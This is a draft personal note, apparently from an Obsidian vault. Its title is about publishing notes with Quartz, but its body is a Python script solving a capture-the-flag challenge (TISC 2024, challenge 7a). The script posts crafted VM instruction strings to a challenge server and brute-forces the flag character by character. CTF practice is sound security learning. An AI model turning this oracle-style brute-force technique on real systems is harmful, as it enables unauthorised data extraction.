---
title: "How to publish Obsidian notes with Quartz on GitHub Pages"
draft: true
tags:
  - 
---
![[Pasted image 20240930055818.png]]

![[Pasted image 20240930055257.png]]

```
#!/usr/bin/python3

import requests, json

TEST_URL = "http://localhost:3000"
PROD_URL = "http://chals.tisc24.ctf.sg:50128"

URL = PROD_URL

admin_req_uri = "/requestadmin"

flag = []

for j in range(32,64):
    for i in range(32,128):
        webasm_instr = "READ:flag.txt;IMM:0:"+str(i)+";IMM:2:"+str(j)+";LOAD:3:2;JZ:3:6;SUB:3:3:0;JZ:3:2;HALT;WRITE:ascii"+str(i)+".txt;HALT;IMM:0:66;IMM:1:65;IMM:2:69;IMM:3:32;IMM:4:33;IMM:5:34;STORE:0:3;STORE:1:4;STORE:2:5;WRITE:ascii"+str(i)+".txt;READ:ascii"+str(i)+".txt;"
        
        data = { "prgmstr":webasm_instr }
        r = requests.post(URL+admin_req_uri,data=data)

        json_resp = json.loads(r.text)

        outcome = (json_resp['userResult']['vm_state']['reg']).split(',')[0]

        if outcome == "255":
            flag.append(chr(int(i)))
            break

print(''.join(flag))
```

dem didn't get the screenshot for the challenge 7a flag.

